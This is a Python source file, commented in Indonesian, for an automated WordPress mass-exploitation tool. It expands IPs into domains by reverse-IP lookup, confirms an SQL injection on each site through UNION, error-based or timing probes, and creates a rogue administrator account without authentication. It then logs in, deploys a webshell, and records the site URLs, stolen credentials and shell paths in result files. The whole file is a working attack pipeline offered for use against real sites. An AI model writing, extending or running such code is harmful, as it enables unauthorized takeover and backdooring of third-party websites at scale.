# wp2shell_scanner.py - WordPress wp2shell scanner for continuous scan mode
import os
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# Import dari wp2shell
from client import BatchClient, TargetError
from sqli import BlindSQLi, UnionSQLi, ErrorBasedSQLi
from version import public_version_hints, wordpress_markers
from exploit import PreAuthAdminCreator
from shell import AdminSession

# Konfigurasi output
OUTPUT_DIR = "wp2shell_results"
VULN_FILE = os.path.join(OUTPUT_DIR, "wp2shell_vuln.txt")
SHELL_FILE = os.path.join(OUTPUT_DIR, "wp2shell_shell.txt")
CRED_FILE = os.path.join(OUTPUT_DIR, "wp2shell_credentials.txt")
_write_lock = threading.RLock()


def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def append_result(path, line):
    ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def check_wp_login(url, timeout=30):
    """Cek apakah wp-login.php dapat diakses"""
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    try:
        login_url = url.rstrip('/') + '/wp-login.php'
        response = requests.get(
            login_url,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        # wp-login.php accessible jika status 200 atau 302/redirect ke login
        if response.status_code in [200, 302, 303, 307, 308]:
            return True, login_url
        return False, login_url
    except Exception:
        return False, None


def check_wp_login_auth(url, timeout=30):
    """Cek apakah wp-login.php memerlukan autentikasi (basic auth)"""
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    try:
        login_url = url.rstrip('/') + '/wp-login.php'
        response = requests.get(
            login_url,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        if response.status_code == 401:
            return True
        return False
    except Exception:
        return False


class Wp2shellScanner:
    """Scanner untuk WordPress wp2shell pada domain hasil reverse IP"""

    def __init__(self, cache_manager, main_reference=None, timeout=40.0, sleep=5.0, rounds=3, do_rce=False):
        self.cache_manager = cache_manager
        self.main = main_reference
        self.timeout = timeout
        self.sleep = sleep
        self.rounds = rounds
        self.do_rce = do_rce
        self.found_urls = set()
        self.lock = threading.Lock()
        self.total_domains = 0
        self.total_vuln = 0
        self.total_rce = 0

    def process_domain(self, domain):
        """Proses satu domain: cek wp2shell vulnerability"""
        url = ensure_scheme(domain)
        if not url:
            return None

        # ===== STEP 1: CEK WP-LOGIN.PHP =====
        wp_login_accessible, login_url = check_wp_login(url, timeout=self.timeout)
        
        if not wp_login_accessible:
            # KONDISI 1: wp-login.php tidak bisa diakses -> SKIP (tidak dicatat)
            print(f"[-] {url}: wp-login.php not accessible, SKIPPING")
            cache_key = f"wp2shell_{url}"
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': 'wp_login_not_accessible',
                'url': url
            }, 'wp2shell')
            return None

        print(f"[+] {url}: wp-login.php accessible")

        # Cek basic auth
        has_basic_auth = check_wp_login_auth(url, timeout=self.timeout)
        if has_basic_auth:
            print(f"[-] {url}: wp-login.php requires basic auth, SKIPPING")
            cache_key = f"wp2shell_{url}"
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': 'wp_login_basic_auth',
                'url': url
            }, 'wp2shell')
            return None

        # Cek cache
        cache_key = f"wp2shell_{url}"
        cached = self.cache_manager.get_reverse_cache(cache_key)
        if cached and cached.get('vuln') == True:
            return cached

        # ===== STEP 2: DETEKSI WORDPRESS =====
        try:
            client = BatchClient(url, timeout=self.timeout)
        except Exception as e:
            return None

        try:
            markers = wordpress_markers(client)
            hints = public_version_hints(client)
        except Exception:
            markers = []
            hints = []

        if not markers and not hints:
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': 'not_wordpress',
                'url': url
            }, 'wp2shell')
            return None

        # ===== STEP 3: PROBE BATCH ROUTE =====
        try:
            probe = client.marker_probe()
        except TargetError:
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': 'unreachable',
                'url': url
            }, 'wp2shell')
            return None

        if probe.status != 207:
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': f'batch_http_{probe.status}',
                'url': url
            }, 'wp2shell')
            return None

        route_confusion = client.has_route_confusion_markers(probe)
        if not route_confusion:
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': 'no_route_confusion',
                'url': url
            }, 'wp2shell')
            return None

        # ===== STEP 4: KONFIRMASI SQLi =====
        confirmed = False
        method = None

        try:
            union = UnionSQLi(client)
            if union.available():
                confirmed = True
                method = "UNION"
        except Exception:
            pass

        if not confirmed:
            try:
                error = ErrorBasedSQLi(client)
                if error.available():
                    confirmed = True
                    method = "error_based"
            except Exception:
                pass

        if not confirmed:
            try:
                blind = BlindSQLi(client, sleep=self.sleep)
                result = blind.confirm_timing(samples=self.rounds)
                confirmed = result.confirmed
                method = f"timing (delta={result.delta:.2f}s)"
            except Exception as e:
                confirmed = False
                method = f"timing_failed: {e}"

        if not confirmed:
            self.cache_manager.save_reverse_cache(cache_key, {
                'vuln': False, 
                'reason': f'sqli_not_confirmed ({method})',
                'url': url
            }, 'wp2shell')
            return None

        # ===== STEP 5: VULNERABLE TERKONFIRMASI =====
        print(f"[*] {url}: SQLi confirmed via {method}")

        # Simpan ke file vuln
        vuln_line = f"{url} [wp2shell] SQLi confirmed via {method}"
        append_result(VULN_FILE, vuln_line)

        result = {
            'vuln': True,
            'url': url,
            'method': method,
            'rce': False,
            'user': None,
            'password': None,
            'shell_uploaded': False,
            'shell_path': None
        }

        # ===== STEP 6: ATTEMPT ADMIN CREATION =====
        admin_created = False
        username = None
        password = None
        
        try:
            print(f"[*] {url}: Attempting pre-auth admin creation...")
            creator = PreAuthAdminCreator(
                url,
                timeout=max(self.timeout, 180.0),
                sleep=self.sleep
            )
            created_admin = creator.create_admin()
            username = created_admin.username
            password = created_admin.password
            admin_created = True
            result['user'] = username
            result['password'] = password
            print(f"[+] {url}: Admin created - {username}:{password}")
        except Exception as e:
            print(f"[-] {url}: Admin creation failed: {e}")

        if not admin_created:
            # Admin creation gagal, tapi site tetap dicatat di vuln
            self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')
            if self.main:
                self.main.increment_wp2shell()
            return result

        # ===== STEP 7: ATTEMPT LOGIN =====
        session = AdminSession(url, timeout=max(self.timeout, 60.0))
        
        try:
            login_success = session.login(username, password)
            if not login_success:
                print(f"[-] {url}: Login failed with {username}:{password}")
                # KONDISI 2: Login gagal -> Catat credentials untuk manual
                cred_line = f"{url} | {username} | {password} | login_failed"
                append_result(CRED_FILE, cred_line)
                result['rce'] = False
                self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')
                if self.main:
                    self.main.increment_wp2shell()
                return result
        except Exception as e:
            print(f"[-] {url}: Login error: {e}")
            cred_line = f"{url} | {username} | {password} | login_error: {e}"
            append_result(CRED_FILE, cred_line)
            result['rce'] = False
            self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')
            if self.main:
                self.main.increment_wp2shell()
            return result

        print(f"[+] {url}: Login successful!")

        # ===== STEP 8: ATTEMPT SHELL UPLOAD =====
        shell_path = None
        shell_uploaded = False
        
        try:
            print(f"[*] {url}: Deploying webshell...")
            shell_path = session.deploy_webshell()
            shell_uploaded = True
            result['shell_uploaded'] = True
            result['shell_path'] = shell_path
            print(f"[+] {url}: Webshell deployed at {shell_path}")
        except Exception as e:
            print(f"[-] {url}: Shell upload failed: {e}")

        # ===== STEP 9: SAVE RESULT =====
        if shell_uploaded:
            # KONDISI 3: Shell BERHASIL upload -> Simpan ke SHELL_FILE
            shell_line = f"{url} | {username} | {password} | {shell_path}"
            append_result(SHELL_FILE, shell_line)
            # Juga simpan ke credentials untuk backup
            cred_line = f"{url} | {username} | {password} | shell_uploaded: {shell_path}"
            append_result(CRED_FILE, cred_line)
            result['rce'] = True
            print(f"[+] {url}: WEBSHELL UPLOADED SUCCESSFULLY!")
            print(f"    Shell: {url}{shell_path}?t=<token>&c=command")
            print(f"    Credentials: {username}:{password}")
            
            if self.main:
                self.main.increment_wp2shell_rce()
        else:
            # KONDISI 2: Shell GAGAL upload -> Catat credentials untuk manual
            cred_line = f"{url} | {username} | {password} | shell_upload_failed"
            append_result(CRED_FILE, cred_line)
            print(f"[!] {url}: Shell upload failed, credentials saved for manual upload")
            print(f"    Credentials: {username}:{password}")
            result['rce'] = False

        # Cache hasil
        self.cache_manager.save_reverse_cache(cache_key, result, 'wp2shell')

        # Update counter
        if self.main:
            self.main.increment_wp2shell()

        return result

    def process_ip(self, ip):
        """Proses satu IP: reverse IP -> dapat domain -> scan wp2shell"""
        if self.cache_manager.is_ip_processed(ip):
            print(f"[↺] Skipping cached IP: {ip}")
            return

        print(f"\n[*] Processing IP: {ip} for wp2shell")

        if self.main and hasattr(self.main, 'scanner'):
            scanner = self.main.scanner
        else:
            print("[!] Scanner not available for reverse IP")
            return

        domains_tnt = scanner.reverse_ip_tntcode(ip)
        time.sleep(1)
        domains_ht = scanner.reverse_ip_hackertarget(ip)

        all_domains = set()
        all_domains.update(domains_tnt)
        all_domains.update(domains_ht)

        if not all_domains:
            print(f"[-] No domains for IP {ip}")
            self.cache_manager.mark_ip_processed(ip, 'no_domains')
            return

        print(f"[+] Total domains: {len(all_domains)} (TNT: {len(domains_tnt)}, HT: {len(domains_ht)})")

        found_count = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.process_domain, domain) for domain in all_domains]
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=180)
                    if result and result.get('vuln'):
                        found_count += 1
                except Exception as e:
                    print(f"[-] Error processing domain: {e}")

        print(f"[+] IP {ip}: {found_count} wp2shell vulnerable domains found")
        self.cache_manager.mark_ip_processed(ip, 'success' if found_count else 'empty')
